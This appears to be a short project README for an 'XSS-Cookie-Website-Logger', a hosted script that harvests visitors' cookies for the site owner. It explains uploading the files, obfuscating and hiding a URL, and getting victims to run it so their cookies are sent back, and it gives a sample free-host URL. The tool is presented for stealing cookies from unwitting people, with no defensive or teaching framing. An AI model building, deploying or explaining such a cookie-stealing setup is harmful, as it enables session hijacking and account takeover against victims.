# XSS-Cookie-Website-Logger
A script that when GET requested fetches the website owner the cookies of their choice.

# Explanation
So basically upload the files to your website then either you can make someone GET http request it and it replies back with their cookie or hide the url somehow then obfuscate it and make them run the url and once they run the url looks like this https://someoneswebsiteorurlidklolfluro#0009.000webhostapp.com/api.js then it will send their cookies lol
